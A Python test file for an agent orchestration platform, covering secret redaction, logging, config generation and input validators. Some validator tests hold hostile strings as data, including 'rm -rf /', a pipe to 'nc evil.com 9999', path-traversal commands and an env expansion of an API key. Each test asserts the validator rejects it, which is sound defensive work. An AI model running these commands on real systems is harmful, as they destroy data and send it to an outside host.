"""Tests covering remaining gaps after rounds 1-2 (228 tests added).

Targeted areas:
  - _redact_sensitive_inputs: security-critical input redaction in execution responses
  - logging_config: _JsonFormatter, _RequestIdFilter, configure_logging, sensitive key redaction
  - http_client: close_client, close_all_clients shutdown paths
  - generate_litellm_config: skipping connections with no model
  - SearchToolsTool._run: discovery tool search functionality
  - _validate_tool_extra: args shell injection, env brace expansion
  - _validate_crew_extra: memory.config URL SSRF validation
  - CycleError: exception with cycle path formatting
  - ValidationError.__repr__: exception repr coverage
  - build_model_string: no-provider edge case already covered, but empty model edge
  - _log_extra helper in wasm_runtime
  - apply_vertex_params: fallback to global settings when vertex dict is empty
"""

import json
import logging
import uuid
from decimal import Decimal
from unittest.mock import MagicMock, patch

import pytest

# ---------------------------------------------------------------------------
# _redact_sensitive_inputs (security-critical — prevents secret leakage)
# ---------------------------------------------------------------------------
from blackbeard.models.execution_schemas import _redact_sensitive_inputs


def test_redact_sensitive_inputs_password():
    """Input keys containing 'password' should be redacted."""
    inputs = {"password": "s3cr3t", "topic": "AI"}
    result = _redact_sensitive_inputs(inputs)
    assert result["password"] == "[REDACTED]"
    assert result["topic"] == "AI"


def test_redact_sensitive_inputs_api_key():
    """Input keys containing 'api_key' should be redacted."""
    inputs = {"api_key": "sk-1234", "name": "test"}
    result = _redact_sensitive_inputs(inputs)
    assert result["api_key"] == "[REDACTED]"
    assert result["name"] == "test"


def test_redact_sensitive_inputs_token():
    """Input keys containing 'token' should be redacted."""
    inputs = {"auth_token": "bearer-xyz", "count": "5"}
    result = _redact_sensitive_inputs(inputs)
    assert result["auth_token"] == "[REDACTED]"
    assert result["count"] == "5"


def test_redact_sensitive_inputs_secret():
    """Input keys containing 'secret' should be redacted."""
    inputs = {"client_secret": "abcd", "mode": "fast"}
    result = _redact_sensitive_inputs(inputs)
    assert result["client_secret"] == "[REDACTED]"


def test_redact_sensitive_inputs_credential():
    """Input keys containing 'credential' should be redacted."""
    inputs = {"credential": "admin:pass"}
    result = _redact_sensitive_inputs(inputs)
    assert result["credential"] == "[REDACTED]"


def test_redact_sensitive_inputs_case_insensitive():
    """Redaction should be case-insensitive."""
    inputs = {"PASSWORD": "x", "Api_Key": "y", "TOKEN": "z"}
    result = _redact_sensitive_inputs(inputs)
    assert result["PASSWORD"] == "[REDACTED]"
    assert result["Api_Key"] == "[REDACTED]"
    assert result["TOKEN"] == "[REDACTED]"


def test_redact_sensitive_inputs_no_sensitive_keys():
    """Non-sensitive keys should pass through unchanged."""
    inputs = {"topic": "AI", "depth": "deep", "count": "3"}
    result = _redact_sensitive_inputs(inputs)
    assert result == inputs


def test_redact_sensitive_inputs_empty():
    """Empty inputs should return empty dict."""
    assert _redact_sensitive_inputs({}) == {}


def test_redact_sensitive_inputs_private_key():
    """Keys containing 'private_key' should be redacted."""
    inputs = {"private_key": "-----BEGIN RSA KEY-----"}
    result = _redact_sensitive_inputs(inputs)
    assert result["private_key"] == "[REDACTED]"


# ---------------------------------------------------------------------------
# logging_config: _RequestIdFilter
# ---------------------------------------------------------------------------

from blackbeard.logging_config import _RequestIdFilter, request_id_var


def test_request_id_filter_injects_request_id():
    """Filter should inject request_id from context var into log record."""
    token = request_id_var.set("test-req-123")
    try:
        f = _RequestIdFilter()
        record = logging.LogRecord("test", logging.INFO, "", 0, "msg", (), None)
        result = f.filter(record)
        assert result is True
        assert record.request_id == "test-req-123"
    finally:
        request_id_var.reset(token)


def test_request_id_filter_default_value():
    """Filter should use '-' when no request_id is set."""
    token = request_id_var.set("-")
    try:
        f = _RequestIdFilter()
        record = logging.LogRecord("test", logging.INFO, "", 0, "msg", (), None)
        f.filter(record)
        assert record.request_id == "-"
    finally:
        request_id_var.reset(token)


# ---------------------------------------------------------------------------
# logging_config: _JsonFormatter
# ---------------------------------------------------------------------------

from blackbeard.logging_config import _JsonFormatter


def test_json_formatter_basic_output():
    """JSON formatter should produce valid JSON with required fields."""
    formatter = _JsonFormatter()
    record = logging.LogRecord("blackbeard.test", logging.INFO, "test.py", 42, "Hello", (), None)
    record.request_id = "req-abc"
    output = formatter.format(record)
    parsed = json.loads(output)
    assert parsed["level"] == "INFO"
    assert parsed["message"] == "Hello"
    assert parsed["service"] == "blackbeard"
    assert parsed["request_id"] == "req-abc"
    assert "timestamp" in parsed


def test_json_formatter_warning_includes_source():
    """WARNING+ logs should include source location."""
    formatter = _JsonFormatter()
    record = logging.LogRecord(
        "blackbeard.test", logging.WARNING, "/app/test.py", 42, "Warn!", (), None
    )
    record.request_id = "-"
    output = formatter.format(record)
    parsed = json.loads(output)
    assert "source" in parsed
    assert "42" in parsed["source"]


def test_json_formatter_info_no_source():
    """INFO logs should NOT include source location."""
    formatter = _JsonFormatter()
    record = logging.LogRecord("blackbeard.test", logging.INFO, "test.py", 42, "Info", (), None)
    record.request_id = "-"
    output = formatter.format(record)
    parsed = json.loads(output)
    assert "source" not in parsed


def test_json_formatter_redacts_sensitive_extra():
    """Extra fields with sensitive key names should be redacted."""
    formatter = _JsonFormatter()
    record = logging.LogRecord("blackbeard.test", logging.INFO, "test.py", 1, "msg", (), None)
    record.request_id = "-"
    record.api_key = "sk-secret-12345"
    record.password = "hunter2"
    record.token = "bearer-xyz"
    output = formatter.format(record)
    parsed = json.loads(output)
    assert parsed["api_key"] == "[REDACTED]"
    assert parsed["password"] == "[REDACTED]"
    assert parsed["token"] == "[REDACTED]"


def test_json_formatter_redacts_suffixed_sensitive_keys():
    """Extra fields ending with sensitive suffixes should be redacted."""
    formatter = _JsonFormatter()
    record = logging.LogRecord("blackbeard.test", logging.INFO, "test.py", 1, "msg", (), None)
    record.request_id = "-"
    record.litellm_api_key = "sk-litellm"
    record.db_password = "pg-secret"
    output = formatter.format(record)
    parsed = json.loads(output)
    assert parsed["litellm_api_key"] == "[REDACTED]"
    assert parsed["db_password"] == "[REDACTED]"


def test_json_formatter_passes_safe_extras():
    """Non-sensitive extra fields should pass through."""
    formatter = _JsonFormatter()
    record = logging.LogRecord("blackbeard.test", logging.INFO, "test.py", 1, "msg", (), None)
    record.request_id = "-"
    record.event = "test_event"
    record.crew_name = "my-crew"
    output = formatter.format(record)
    parsed = json.loads(output)
    assert parsed["event"] == "test_event"
    assert parsed["crew_name"] == "my-crew"


def test_json_formatter_exception_info():
    """Formatter should include exception info when present."""
    formatter = _JsonFormatter()
    try:
        raise ValueError("test error")
    except ValueError:
        import sys

        exc_info = sys.exc_info()
        record = logging.LogRecord(
            "blackbeard.test", logging.ERROR, "test.py", 1, "Failed", (), exc_info
        )
        record.request_id = "-"
        output = formatter.format(record)
        parsed = json.loads(output)
        assert "exception" in parsed
        assert parsed["error.type"] == "ValueError"


# ---------------------------------------------------------------------------
# logging_config: configure_logging
# ---------------------------------------------------------------------------

from blackbeard.logging_config import configure_logging


def test_configure_logging_debug_mode():
    """configure_logging in debug mode should set DEBUG level."""
    configure_logging(debug=True)
    logger = logging.getLogger("blackbeard")
    assert logger.level == logging.DEBUG


def test_configure_logging_production_mode():
    """configure_logging in production mode should set INFO level."""
    configure_logging(debug=False)
    logger = logging.getLogger("blackbeard")
    assert logger.level == logging.INFO


def test_configure_logging_explicit_log_level():
    """configure_logging with explicit log_level should use it."""
    configure_logging(debug=False, log_level="WARNING")
    logger = logging.getLogger("blackbeard")
    assert logger.level == logging.WARNING


def test_configure_logging_invalid_log_level_fallback():
    """configure_logging with invalid log_level should fall back to default."""
    configure_logging(debug=True, log_level="NOTAVALIDLEVEL")
    logger = logging.getLogger("blackbeard")
    assert logger.level == logging.DEBUG


# ---------------------------------------------------------------------------
# http_client: close_client and close_all_clients
# ---------------------------------------------------------------------------

from blackbeard.http_client import _clients, _lock, _sync_clients, close_all_clients, close_client


@pytest.mark.asyncio
async def test_close_client_removes_and_closes():
    """close_client should remove the named client and call aclose()."""
    import httpx

    mock_client = MagicMock(spec=httpx.AsyncClient)

    async def _noop_close():
        pass

    mock_client.aclose = _noop_close
    with _lock:
        _clients["_test_close"] = mock_client
    await close_client("_test_close")
    assert "_test_close" not in _clients


@pytest.mark.asyncio
async def test_close_client_nonexistent_noop():
    """close_client for a nonexistent name should be a no-op."""
    await close_client("_nonexistent_client")
    # Should not raise


@pytest.mark.asyncio
async def test_close_all_clients_handles_errors():
    """close_all_clients should log but not raise on individual close errors."""
    import httpx

    mock_async = MagicMock(spec=httpx.AsyncClient)

    async def _raise_on_close():
        raise RuntimeError("close failed")

    mock_async.aclose = _raise_on_close

    mock_sync = MagicMock(spec=httpx.Client)
    mock_sync.close = MagicMock(side_effect=RuntimeError("sync close failed"))

    with _lock:
        _clients["_test_err_async"] = mock_async
        _sync_clients["_test_err_sync"] = mock_sync

    # Should not raise even though both close() calls fail
    await close_all_clients()

    assert "_test_err_async" not in _clients
    assert "_test_err_sync" not in _sync_clients


# ---------------------------------------------------------------------------
# generate_litellm_config: skipping connections with no model
# ---------------------------------------------------------------------------

import yaml

from blackbeard.kinds import ResourceKind
from blackbeard.litellm.config_gen import generate_litellm_config
from blackbeard.models.resource import Resource


def _make_llm_conn(name, spec):
    r = Resource()
    r.kind = ResourceKind.LLM_CONNECTION
    r.name = name
    r.namespace = "default"
    r.spec = spec
    return r


def test_config_gen_skips_no_model():
    """Connections without a model field should be skipped."""
    conn = _make_llm_conn("empty-conn", {"provider": "openai"})
    config_str = generate_litellm_config([conn])
    config = yaml.safe_load(config_str)
    assert config["model_list"] == []


def test_config_gen_skips_empty_model():
    """Connections with empty string model should be skipped."""
    conn = _make_llm_conn("empty-model", {"provider": "openai", "model": ""})
    config_str = generate_litellm_config([conn])
    config = yaml.safe_load(config_str)
    assert config["model_list"] == []


def test_config_gen_mixed_valid_and_skipped():
    """Valid and invalid connections should produce correct count."""
    conns = [
        _make_llm_conn("valid", {"provider": "openai", "model": "gpt-4o"}),
        _make_llm_conn("invalid", {"provider": "openai"}),  # no model
    ]
    config_str = generate_litellm_config(conns)
    config = yaml.safe_load(config_str)
    assert len(config["model_list"]) == 1
    assert config["model_list"][0]["model_name"] == "valid"


# ---------------------------------------------------------------------------
# SearchToolsTool._run: basic functionality
# ---------------------------------------------------------------------------


def test_search_tools_tool_empty_query():
    """SearchToolsTool with empty query should not crash."""
    from blackbeard.engine.discovery_tools import SearchToolsTool

    tool = SearchToolsTool(
        api_url="http://localhost:8000",
        api_key="test-key",
        namespace="default",
    )
    # Mock the HTTP client to avoid real requests
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {"items": []}

    mock_client = MagicMock()
    mock_client.get.return_value = mock_resp

    with patch("blackbeard.engine.discovery_tools.get_sync_client", return_value=mock_client):
        result = tool._run("")
    assert result == "No tools found matching your query."


def test_search_tools_tool_with_matches():
    """SearchToolsTool should return matching tools as JSON."""
    from blackbeard.engine.discovery_tools import SearchToolsTool

    tool = SearchToolsTool(
        api_url="http://localhost:8000",
        api_key="test-key",
        namespace="default",
    )
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "items": [
            {
                "metadata": {"name": "web-search"},
                "spec": {"type": "python", "description": "Search the web"},
            }
        ]
    }

    mock_client = MagicMock()
    mock_client.get.return_value = mock_resp

    with patch("blackbeard.engine.discovery_tools.get_sync_client", return_value=mock_client):
        result = tool._run("search")
    parsed = json.loads(result)
    assert len(parsed) == 1
    assert parsed[0]["name"] == "web-search"


def test_search_tools_tool_http_error():
    """SearchToolsTool should handle non-200 responses."""
    from blackbeard.engine.discovery_tools import SearchToolsTool

    tool = SearchToolsTool(
        api_url="http://localhost:8000",
        api_key="test-key",
        namespace="default",
    )
    mock_resp = MagicMock()
    mock_resp.status_code = 500

    mock_client = MagicMock()
    mock_client.get.return_value = mock_resp

    with patch("blackbeard.engine.discovery_tools.get_sync_client", return_value=mock_client):
        result = tool._run("anything")
    assert "error" in result.lower()


def test_search_tools_tool_exception_handling():
    """SearchToolsTool should catch exceptions and return error message."""
    from blackbeard.engine.discovery_tools import SearchToolsTool

    tool = SearchToolsTool(
        api_url="http://localhost:8000",
        api_key="test-key",
        namespace="default",
    )
    with patch(
        "blackbeard.engine.discovery_tools.get_sync_client",
        side_effect=RuntimeError("connection refused"),
    ):
        result = tool._run("anything")
    assert "error" in result.lower()


# ---------------------------------------------------------------------------
# GetToolTool._run: 404 and success paths
# ---------------------------------------------------------------------------


def test_get_tool_tool_not_found():
    """GetToolTool should handle 404 responses."""
    from blackbeard.engine.discovery_tools import GetToolTool

    tool = GetToolTool(
        api_url="http://localhost:8000",
        api_key="test-key",
        namespace="default",
    )
    mock_resp = MagicMock()
    mock_resp.status_code = 404

    mock_client = MagicMock()
    mock_client.get.return_value = mock_resp

    with patch("blackbeard.engine.discovery_tools.get_sync_client", return_value=mock_client):
        result = tool._run("valid-name")
    assert "not found" in result.lower()


def test_get_tool_tool_success():
    """GetToolTool should return tool details on success."""
    from blackbeard.engine.discovery_tools import GetToolTool

    tool = GetToolTool(
        api_url="http://localhost:8000",
        api_key="test-key",
        namespace="default",
    )
    mock_resp = MagicMock()
    mock_resp.status_code = 200
    mock_resp.json.return_value = {
        "metadata": {"name": "web-search"},
        "spec": {
            "type": "python",
            "description": "Search the web",
            "config": {"k": 5},
            "sandbox": None,
            "class_path": "crewai_tools.SearchTool",
        },
    }

    mock_client = MagicMock()
    mock_client.get.return_value = mock_resp

    with patch("blackbeard.engine.discovery_tools.get_sync_client", return_value=mock_client):
        result = tool._run("web-search")
    parsed = json.loads(result)
    assert parsed["name"] == "web-search"
    assert parsed["type"] == "python"


def test_get_tool_tool_exception():
    """GetToolTool should catch exceptions and return error message."""
    from blackbeard.engine.discovery_tools import GetToolTool

    tool = GetToolTool(
        api_url="http://localhost:8000",
        api_key="test-key",
        namespace="default",
    )
    with patch(
        "blackbeard.engine.discovery_tools.get_sync_client",
        side_effect=RuntimeError("boom"),
    ):
        result = tool._run("valid-tool")
    assert "error" in result.lower()


# ---------------------------------------------------------------------------
# _validate_tool_extra: args shell injection validation
# ---------------------------------------------------------------------------

from blackbeard.resources.validator import _validate_tool_extra


def test_tool_args_blocks_shell_metachar_semicolon():
    """Tool args containing semicolon should be rejected."""
    errors = []
    spec = {"type": "mcp-stdio", "command": "server", "args": ["--flag; rm -rf /"]}
    _validate_tool_extra(spec, errors)
    assert any("metachar" in e.message.lower() for e in errors)


def test_tool_args_blocks_pipe():
    """Tool args containing pipe should be rejected."""
    errors = []
    spec = {"type": "mcp-stdio", "command": "server", "args": ["data | nc evil.com 9999"]}
    _validate_tool_extra(spec, errors)
    assert any("metachar" in e.message.lower() for e in errors)


def test_tool_args_allows_safe_values():
    """Tool args without metacharacters should pass."""
    errors = []
    spec = {"type": "mcp-stdio", "command": "server", "args": ["-y", "some-package", "--port=8080"]}
    _validate_tool_extra(spec, errors)
    assert errors == []


def test_tool_command_blocks_path_traversal():
    """Tool command with path traversal should be rejected."""
    errors = []
    spec = {"type": "mcp-stdio", "command": "../../../bin/evil"}
    _validate_tool_extra(spec, errors)
    assert any("traversal" in e.message.lower() for e in errors)


def test_tool_command_blocks_absolute_path():
    """Tool command with absolute path should be rejected."""
    errors = []
    spec = {"type": "mcp-stdio", "command": "/usr/bin/evil"}
    _validate_tool_extra(spec, errors)
    assert any("traversal" in e.message.lower() or "path" in e.message.lower() for e in errors)


def test_tool_command_blocks_tilde():
    """Tool command starting with ~ should be rejected."""
    errors = []
    spec = {"type": "mcp-stdio", "command": "~/bin/evil"}
    _validate_tool_extra(spec, errors)
    assert len(errors) > 0


# ---------------------------------------------------------------------------
# _validate_tool_extra: env brace expansion ${BLOCKED_PREFIX}
# ---------------------------------------------------------------------------


def test_tool_env_blocks_brace_expansion_blocked_prefix():
    """Tool env values with ${BLACKBEARD_...} brace expansion should be rejected."""
    errors = []
    spec = {
        "type": "mcp-stdio",
        "command": "server",
        "env": {"MY_VAR": "prefix-${BLACKBEARD_API_KEY}"},
    }
    _validate_tool_extra(spec, errors)
    assert any("shell expansion" in e.message.lower() for e in errors)


def test_tool_env_blocks_brace_expansion_exact_match():
    """Tool env values with ${PATH} brace expansion should be rejected."""
    errors = []
    spec = {
        "type": "mcp-stdio",
        "command": "server",
        "env": {"MY_VAR": "add:${PATH}"},
    }
    _validate_tool_extra(spec, errors)
    assert any("shell expansion" in e.message.lower() for e in errors)


# ---------------------------------------------------------------------------
# _validate_crew_extra: memory.config URL SSRF
# ---------------------------------------------------------------------------

from blackbeard.resources.validator import _validate_crew_extra


def test_crew_memory_config_blocks_internal_url():
    """Crew memory.config with internal URL should be flagged."""
    errors = []
    spec = {
        "process": "sequential",
        "agents": ["ref:agents/ag"],
        "tasks": ["ref:tasks/tk"],
        "memory": {
            "enabled": True,
            "config": {"url": "http://localhost:6379"},
        },
    }
    _validate_crew_extra(spec, errors)
    assert len(errors) > 0
    assert any("internal" in e.message.lower() for e in errors)


def test_crew_memory_config_allows_external_url():
    """Crew memory.config with external URL should pass."""
    errors = []
    spec = {
        "process": "sequential",
        "agents": ["ref:agents/ag"],
        "tasks": ["ref:tasks/tk"],
        "memory": {
            "enabled": True,
            "config": {"url": "https://redis.cloud.example.com:6380"},
        },
    }
    _validate_crew_extra(spec, errors)
    # Should have no SSRF errors (may have DNS errors depending on resolution)
    ssrf_errors = [e for e in errors if "internal" in e.message.lower()]
    assert ssrf_errors == []


# ---------------------------------------------------------------------------
# CycleError: exception formatting
# ---------------------------------------------------------------------------

from blackbeard.resources.refs import CycleError


def test_cycle_error_message():
    """CycleError should format cycle path in message."""
    err = CycleError(["Agent/a", "Task/b", "Agent/a"])
    assert "Agent/a" in str(err)
    assert "Task/b" in str(err)
    assert " -> " in str(err)
    assert err.cycle == ["Agent/a", "Task/b", "Agent/a"]


# ---------------------------------------------------------------------------
# ValidationError.__repr__
# ---------------------------------------------------------------------------

from blackbeard.resources.exceptions import ValidationError as ResValidationError


def test_validation_error_repr():
    """ValidationError repr should include field and message."""
    err = ResValidationError("spec.role", "Missing required field")
    r = repr(err)
    assert "spec.role" in r
    assert "Missing required field" in r


# ---------------------------------------------------------------------------
# _log_extra helper in wasm_runtime
# ---------------------------------------------------------------------------

from blackbeard.engine.sandbox.wasm_runtime import _log_extra


def test_log_extra_with_execution_id():
    """_log_extra with execution_id should include it in the dict."""
    result = _log_extra("exec-123", event="test", value=42)
    assert result["execution_id"] == "exec-123"
    assert result["event"] == "test"
    assert result["value"] == 42


def test_log_extra_without_execution_id():
    """_log_extra without execution_id should not include it."""
    result = _log_extra(None, event="test")
    assert "execution_id" not in result
    assert result["event"] == "test"


# ---------------------------------------------------------------------------
# WasmExecutionError and WasmTimeoutError hierarchy
# ---------------------------------------------------------------------------

from blackbeard.engine.sandbox.wasm_runtime import WasmExecutionError, WasmTimeoutError


def test_wasm_timeout_is_execution_error():
    """WasmTimeoutError should be a subclass of WasmExecutionError."""
    err = WasmTimeoutError("fuel limit exceeded")
    assert isinstance(err, WasmExecutionError)
    assert isinstance(err, Exception)


# ---------------------------------------------------------------------------
# _validate_llm_connection_extra: api_key_env exact match
# ---------------------------------------------------------------------------

from blackbeard.resources.validator import _validate_llm_connection_extra


def test_llm_connection_blocks_exact_env_var():
    """api_key_env matching an exact blocked var should be rejected."""
    errors = []
    spec = {"provider": "openai", "model": "gpt-4o", "api_key_env": "OPENAI_API_KEY"}
    _validate_llm_connection_extra(spec, errors)
    assert any("internal" in e.message.lower() for e in errors)


def test_llm_connection_allows_custom_env_var():
    """api_key_env with a custom name should be allowed."""
    errors = []
    spec = {"provider": "openai", "model": "gpt-4o", "api_key_env": "MY_OPENAI_KEY"}
    _validate_llm_connection_extra(spec, errors)
    assert errors == []


# ---------------------------------------------------------------------------
# ExecutionResponse.from_db: inputs with sensitive keys are redacted
# ---------------------------------------------------------------------------


def test_execution_response_redacts_sensitive_inputs():
    """ExecutionResponse.from_db should redact sensitive input keys."""
    from blackbeard.models.execution import Execution, ExecutionStatus

    e = Execution()
    e.id = uuid.uuid4()
    e.crew_name = "test-crew"
    e.crew_namespace = "default"
    e.status = ExecutionStatus.QUEUED
    e.inputs = {"topic": "AI", "api_key": "sk-secret-123", "password": "hunter2"}
    e.outputs = None
    e.error = None
    e.total_tokens = 0
    e.prompt_tokens = 0
    e.completion_tokens = 0
    e.cost_usd = Decimal("0")
    e.created_at = None
    e.started_at = None
    e.completed_at = None
    e.tasks = []

    from blackbeard.models.execution_schemas import ExecutionResponse

    resp = ExecutionResponse.from_db(e)
    assert resp.inputs["topic"] == "AI"
    assert resp.inputs["api_key"] == "[REDACTED]"
    assert resp.inputs["password"] == "[REDACTED]"


def test_execution_response_empty_inputs():
    """ExecutionResponse.from_db with None inputs should return empty dict."""
    from blackbeard.models.execution import Execution, ExecutionStatus

    e = Execution()
    e.id = uuid.uuid4()
    e.crew_name = "test-crew"
    e.crew_namespace = "default"
    e.status = ExecutionStatus.QUEUED
    e.inputs = None
    e.outputs = None
    e.error = None
    e.total_tokens = 0
    e.prompt_tokens = 0
    e.completion_tokens = 0
    e.cost_usd = Decimal("0")
    e.created_at = None
    e.started_at = None
    e.completed_at = None
    e.tasks = []

    from blackbeard.models.execution_schemas import ExecutionResponse

    resp = ExecutionResponse.from_db(e)
    assert resp.inputs == {}


# ---------------------------------------------------------------------------
# apply_vertex_params: fallback to global settings
# ---------------------------------------------------------------------------

from blackbeard.litellm.helpers import apply_vertex_params


def test_apply_vertex_params_fallback_to_global():
    """apply_vertex_params with empty vertex dict should use global config."""
    from blackbeard.config import settings

    target = {}
    apply_vertex_params(target, {})
    # With default config, cloud_ml_region is "us-east5"
    if settings.google_cloud_project:
        assert "vertex_project" in target
    assert target.get("vertex_location") == settings.cloud_ml_region


# ---------------------------------------------------------------------------
# Tool: _validate_tool_extra with env containing non-string values
# ---------------------------------------------------------------------------


def test_tool_env_ignores_non_string_values():
    """Non-string env values should not trigger validation errors."""
    errors = []
    spec = {"type": "mcp-stdio", "command": "server", "env": {"COUNT": 42, "ENABLED": True}}
    _validate_tool_extra(spec, errors)
    assert errors == []


def test_tool_env_ignores_non_string_keys():
    """Non-string env keys should not trigger blocked prefix check."""
    errors = []
    # In practice keys should always be strings, but testing robustness
    spec = {"type": "mcp-stdio", "command": "server", "env": {123: "value"}}
    _validate_tool_extra(spec, errors)
    assert errors == []


# ---------------------------------------------------------------------------
# Middleware: get_request_id with valid client ID
# ---------------------------------------------------------------------------

from blackbeard.api.middleware import get_request_id


def test_get_request_id_valid_client_id():
    """Valid client X-Request-Id should be used as-is."""
    mock_request = MagicMock()
    mock_request.headers = {"X-Request-Id": "valid-id-123"}
    result = get_request_id(mock_request)
    assert result == "valid-id-123"


def test_get_request_id_invalid_client_id():
    """Invalid client X-Request-Id should be replaced with UUID."""
    mock_request = MagicMock()
    mock_request.headers = {"X-Request-Id": "invalid id with spaces!"}
    result = get_request_id(mock_request)
    assert result != "invalid id with spaces!"
    uuid.UUID(result)  # Should parse as valid UUID


def test_get_request_id_no_client_id():
    """Missing X-Request-Id should generate a UUID."""
    mock_request = MagicMock()
    mock_request.headers = {}
    result = get_request_id(mock_request)
    uuid.UUID(result)  # Should parse as valid UUID


def test_get_request_id_too_long():
    """X-Request-Id longer than 64 chars should be replaced."""
    mock_request = MagicMock()
    mock_request.headers = {"X-Request-Id": "a" * 65}
    result = get_request_id(mock_request)
    assert result != "a" * 65
    uuid.UUID(result)


# ---------------------------------------------------------------------------
# _validate_knowledge_source_extra: urls with embedded credentials
# ---------------------------------------------------------------------------

from blackbeard.resources.validator import _validate_knowledge_source_extra


def test_knowledge_source_blocks_url_with_credentials():
    """KnowledgeSource urls with embedded credentials should be rejected."""
    errors = []
    spec = {"type": "url", "urls": ["https://user:pass@internal.example.com/data"]}
    _validate_knowledge_source_extra(spec, errors)
    assert any("credentials" in e.message.lower() for e in errors)


def test_knowledge_source_non_list_file_paths_ignored():
    """Non-list file_paths should be silently ignored (schema handles this)."""
    errors = []
    spec = {"type": "text", "file_paths": "not-a-list"}
    _validate_knowledge_source_extra(spec, errors)
    # Should not crash; schema validation handles the wrong type
    assert errors == []


# ---------------------------------------------------------------------------
# Engine __init__ lazy import: AttributeError for unknown names
# ---------------------------------------------------------------------------


def test_engine_init_unknown_attribute():
    """Importing an unknown name from engine should raise AttributeError."""
    from blackbeard import engine

    with pytest.raises(AttributeError, match="has no attribute"):
        engine.__getattr__("nonexistent_function")
